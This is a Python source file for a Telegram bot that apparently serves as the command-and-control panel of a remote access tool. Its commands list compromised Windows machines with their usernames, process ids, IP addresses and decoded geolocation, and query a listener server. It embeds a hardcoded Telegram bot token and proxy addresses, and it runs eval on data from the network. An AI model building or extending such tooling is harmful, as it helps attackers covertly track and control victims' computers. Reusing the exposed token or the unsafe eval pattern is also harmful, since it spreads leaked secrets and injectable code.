import telebot
from http.server import BaseHTTPRequestHandler
from requests import post
from prettytable import PrettyTable


import os, socket
from ast import literal_eval

# from legend import server_legacy

global url
url = "http://127.0.0.1:65000"

"""
def prety(clients):
    q = ""
    strin = {'alias': 5, 'ops': 3, 'user': 4, 'pid': 3, 'pwd': 3, 'clientip': 8}
    stri = '│ alias │ ops │ user │ pid │ pwd │ clientip │'

    for i in clients:
        o = 5
        head = '┌'
        bottom = '└'
        c = clients[i]
        k = c.__dict__
        for el in k:
            if 'cle' in el:
                name = el.split('_')[0]
                strin[name] = max(strin[name], len(k[el]))
                o += strin[name] + 2
                head += '─' * (strin[name] + 2) + '┬'
                bottom += '─' * (strin[name] + 2) + '┴'

        head = head[0:-1] + '┐'
        bottom = bottom[0:-1] + '┘'

    if clients != {}:
        s = '├'

        q += head + "\n"

        for word in stri.split('│')[1:-1]:
            word = word[1:-1]
            q += ('│' + ' ' * (strin[word] - len(word) + 1) + word + ' ')
            s += '─' * (strin[word] + 1) + '─' + '┼'
        s = s[0:-1] + '┤'
        q += '│' + "\n"

        for i in clients:
            q += s + "\n"
            q += '│'
            c = clients[i]
            k = c.__dict__

            for el in k:
                if 'cle' in el:
                    q += (' ' * (strin[el.split('_')[0]] + 1 - len(k[el])) + f'{k[el]} │')
            q += "\n"
        q += bottom + "\n"
    else:
        q += ('┌' + '─' * 6 + '┐' + "\n")
        q += ('│ None │' + "\n")
        q += ('└' + '─' * 6 + '┘' + "\n")
    return q
"""

def prety(clients):
    table = PrettyTable()
    # print(clients)
    table.field_names = ["alias", "ops", "username", "pid", "client ip"]
    for alias in clients:
        client = clients[alias]
        _ = [alias, "windows", client['user_cle'], client['pid_cle'], client['clientip_cle']]
        table.add_row(_)
        # table.add_row([client[el] for el in client])
    return table.get_string()

def info(client):
    import base64
    table = PrettyTable()
    table.field_names = ["alias", "ops", "username", "pid", "client ip", "geo"]
    geo = base64.b64decode(client[4]).decode()
    geo = geo.replace("\n", "\t")
    _ = [client[0], "windows", client[1], client[2], client[3], geo]
    table.add_row(_)
    # table.add_row([client[el] for el in client])
    return table.get_string()

class Connect(BaseHTTPRequestHandler):
    global req_head
    def __init__(self, ops_cle='windows', user_cle='', pid_cle='', clientip_cle='', server_address=(), alias_cle=''):
        # super(Connect, self).__init__()
        self.alias_cle = alias_cle
        self.ops_cle = ops_cle
        self.user_cle = user_cle
        self.pid_cle = pid_cle
        self.s = ''
        self.cont = ''
        self.serv_ip = server_address[0]
        self.serv_port = server_address[1]
        self.server_address = server_address
        self.clientip_cle = clientip_cle
        self.client = ''
        self.addr = ''

    def initiate(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        self.s.bind((self.server_address))
        self.s.listen(5)
        # self.s = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        # self.s.load_cert_chain("D:\\certs\\cert.pem", "D:\\certs\\key.pem")
        # self.s = s.wrap_socket(ss, server_side=True)
        self.client, self.addr = self.s.accept()

    def send(self, cmd=''):
        self.client.send(cmd.encode('cp65001'))

    def recv(self):
        return self.client.recv(1024).decode('cp65001')

    def close(self):
        self.s.close()


def help():
    return (r"""
comps - display connected computers
connect [-A] - connect to computer with alias
alias [-pr_A] [-new_A] - rename connection from A to B
    """)


def check_clients(clients):
    global url
    try:
        creds = ("user", "pas")
        data = {"port": 3214, "alias": "all"}
        q = post(url, auth=creds, data=data).text
        q = q.split("\n")
        return q
    except:
        return ['']


clients_d = {}
clients = {}

token = '6086061913:AAHiEN1JDxrdJnsm0KFcfygTK8nyjRvBIZ4'
# proxy = ('socks5://189.100.122.140:35759/', 'socks5://75.110.224.94:45554/', 'socks5://189.63.89.168:43216/', 'socks5://50.30.205.71:45554/', '')[ri(0,3)]
# proxy = 'socks5h://79.104.34.214:1080'
# proxy = 'socks5://135.125.68.145:1080'

# bot = aiogram.Bot(token=token, proxy=proxy)
# apihelper.proxy = {'https': proxy}
bot = telebot.TeleBot(token)

# keyboards
keyboard1 = telebot.types.ReplyKeyboardMarkup()
keyboard1.row('/check', '/ping')

keyboard2 = telebot.types.ReplyKeyboardMarkup()
keyboard2.row('/connect','/check', "/change_alias")


@bot.message_handler(commands=['start'])
def welcome_start(message):
    bot.send_message(message.chat.id, 'Приветствую тебя user', reply_markup=keyboard1)


@bot.message_handler(commands=['check'])
def check(message):
    global clients_d
    global clients
    try:
        __ = check_clients(clients_d)
        
        clients_d = __
        if clients_d != ['[]']:
            for l in eval(str(clients_d[0])):
                alias = l[0]
                l = l[1:]
            # perm = literal_eval(l)
            # clients[alias] = perm
                perm = {}
                perm["user_cle"] = l[0]
                perm["pid_cle"] = int(l[1])
                perm["clientip_cle"] = l[2]
                clients[alias[1:-1]] = perm
            # print(clients)
            # clients[str(el)] = Connect(user_cle=perm['user_cle'], pid_cle=perm['pid_cle'], pwd_cle=perm['pwd_cle'], clientip_cle=perm['clientip_cle'], server_address=perm['server_address'], alias_cle=perm['alias_cle'])
            bot.send_message(message.chat.id, prety(clients), reply_markup=keyboard2)
        else: bot.send_message(message.chat.id, "None", reply_markup=keyboard2)
    except Exception as e:
        bot.send_message(message.chat.id, "Smth went wrong", reply_markup=keyboard2)
        print(e)


@bot.message_handler(commands=['change_alias'])
def ch_al(message):
    bot.send_message(message.chat.id, "Under construction")
    '''
    global clients
    _, al_1, al_2 = message.text.split()
    clients[al_2] = clients.pop(al_1)
    clients[al_2].alias = al_2
    print(clients)
    bot.send_message(message.chat.id, prety(clients), reply_markup=keyboard2)
    '''


@bot.message_handler(commands=['connect'])
def connect(message):
    bot.send_message(message.chat.id, "Under construction", reply_markup=keyboard1)
    return
    global url
    try:
        txt = message.text.split()
    except:
        bot.send_message(message.chat.id, "Error: maybe missed alias or/and ip", reply_matkup=keyboard1)
    data = {"port": 7507, "alias": txt[1], "ip_s": txt[2]}
    # print(data)
    
    creds =  ('user', 'pas')
    q = post(url, auth=creds, data=data)
    bot.send_message(message.chat.id, "JK", reply_markup=keyboard1)



@bot.message_handler(commands=['ping'])
def ping(message):
    global url
    data = {"command": "ping"}
    creds = ('ping', 'credentials')
    try:
        q = post(url, data=data, auth=creds).status_code
        if q == 200:
            bot.send_message(message.chat.id, "Server is stable", reply_markup=keyboard1)
        else:
            bot.send_message(message.chat.id, "Server is unstable", reply_markup=keyboard1)
    except:
        bot.send_message(message.chat.id, "Server is unstable", reply_markup=keyboard1)

@bot.message_handler(commands=['info'])
def get_info(message):
    global url
    creds = ('user', 'pas')
    try:
        txt = message.text.split()
    except:
        bot.send_message(message.chat.id, "Error: probably forgot to specify alias")
        return
    data = {"port": 3214, "alias": txt[1]}
    q = post(url, data=data, auth=creds).text
    q = q[2:-2].split(", ")
    bot.send_message(message.chat.id, info(q), reply_markup=keyboard1)


bot.polling()
